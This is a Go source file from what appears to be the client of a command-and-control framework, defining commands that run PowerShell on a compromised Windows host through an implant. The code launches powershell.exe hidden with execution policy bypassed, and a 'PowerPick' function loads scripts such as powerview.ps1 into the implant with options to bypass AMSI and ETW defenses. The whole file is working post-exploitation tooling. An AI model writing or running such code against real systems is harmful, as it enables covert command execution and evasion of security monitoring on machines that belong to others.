package exec

import (
	"bytes"
	"fmt"
	"github.com/chainreactors/malice-network/client/command/common"
	"github.com/chainreactors/malice-network/client/core"
	"github.com/chainreactors/malice-network/client/repl"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/proto/services/clientrpc"
	"github.com/kballard/go-shellquote"
	"github.com/spf13/cobra"
	"os"
	"strings"
)

func PowershellCmd(cmd *cobra.Command, con *repl.Console) error {
	session := con.GetInteractive()
	//token := ctx.Flags.Bool("token")
	quiet, _ := cmd.Flags().GetBool("quiet")
	cmdStr := shellquote.Join(cmd.Flags().Args()...)
	task, err := Powershell(con.Rpc, session, cmdStr, !quiet)
	if err != nil {
		return err
	}
	con.GetInteractive().Console(task, "powershell: "+cmdStr)
	return nil
}

func Powershell(rpc clientrpc.MaliceRPCClient, sess *core.Session, cmd string, output bool) (*clientpb.Task, error) {
	task, err := rpc.Execute(sess.Context(), &implantpb.ExecRequest{
		Path:   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		Args:   []string{"-ExecutionPolicy", "Bypass", "-w", "hidden", "-nop", cmd},
		Output: output,
	})
	if err != nil {
		return nil, err
	}
	return task, nil
}

func ExecutePowershellCmd(cmd *cobra.Command, con *repl.Console) error {
	script, _ := cmd.Flags().GetString("script")
	cmdline := cmd.Flags().Args()
	session := con.GetInteractive()
	amsi, etw := common.ParseCLRFlags(cmd)
	task, err := PowerPick(con.Rpc, session, script, cmdline, amsi, etw)
	if err != nil {
		return err
	}
	con.GetInteractive().Console(task, fmt.Sprintf("%s, args: %v", script, cmdline))
	return nil
}

func PowerPick(rpc clientrpc.MaliceRPCClient, sess *core.Session, path string, ps []string, amsi, etw bool) (*clientpb.Task, error) {
	var psBin bytes.Buffer
	if path != "" {
		content, err := os.ReadFile(path)
		if err != nil {
			return nil, err
		}
		psBin.Write(content)
		psBin.WriteString("\n")
	}
	psBin.WriteString(strings.Join(ps, " "))
	binary := &implantpb.ExecuteBinary{
		Bin:    psBin.Bytes(),
		Type:   consts.ModulePowerpick,
		Output: true,
	}
	common.UpdateClrBinary(binary, etw, amsi)
	task, err := rpc.ExecutePowerpick(sess.Context(), binary)
	if err != nil {
		return nil, err
	}
	return task, nil
}

func RegisterPowershellFunc(con *repl.Console) {
	con.RegisterImplantFunc(
		consts.ModulePowerpick,
		PowerPick,
		"bpowerpick",
		func(rpc clientrpc.MaliceRPCClient, sess *core.Session, script string, ps string) (*clientpb.Task, error) {
			cmdline, err := shellquote.Split(ps)
			if err != nil {
				return nil, err
			}
			return PowerPick(rpc, sess, script, cmdline, true, true)
		},
		common.ParseAssembly,
		nil)
	//rpc clientrpc.MaliceRPCClient, sess *core.Session, path string, ps []string, amsi, etw bool
	con.AddInternalFuncHelper(
		consts.ModulePowerpick,
		consts.ModulePowerpick,
		consts.ModulePowerpick+`(active(),"powerview.ps1",{""},true,true))`,
		[]string{
			"session: special session",
			"path: powershell script",
			"ps: ps args",
			"amsi",
			"etw",
		},
		[]string{"task"})

	con.AddInternalFuncHelper(
		"bpowerpick",
		"bpowerpick",
		`bpowerpick(active(),"powerview.ps1",{""}))`,
		[]string{
			"session: special session",
			"path: powershell script",
			"ps: ps args",
		},
		[]string{"task"})

	con.RegisterImplantFunc(
		consts.ModuleAliasPowershell,
		Powershell,
		"bpowershell",
		func(rpc clientrpc.MaliceRPCClient, sess *core.Session, cmdline string) (*clientpb.Task, error) {
			return Powershell(rpc, sess, cmdline, true)
		},
		common.ParseExecResponse,
		nil,
	)

	con.AddInternalFuncHelper(
		consts.ModuleAliasPowershell,
		consts.ModuleAliasPowershell,
		consts.ModuleAliasPowershell+`(active(),"dir",true))`,
		[]string{
			"session",
			"cmd",
			"output",
		},
		[]string{"task"})

	con.AddInternalFuncHelper(
		"bpowershell",
		"bpowershell",
		`bpowershell(active(),"dir")`,
		[]string{
			"session",
			"cmd",
		},
		[]string{"task"})

}
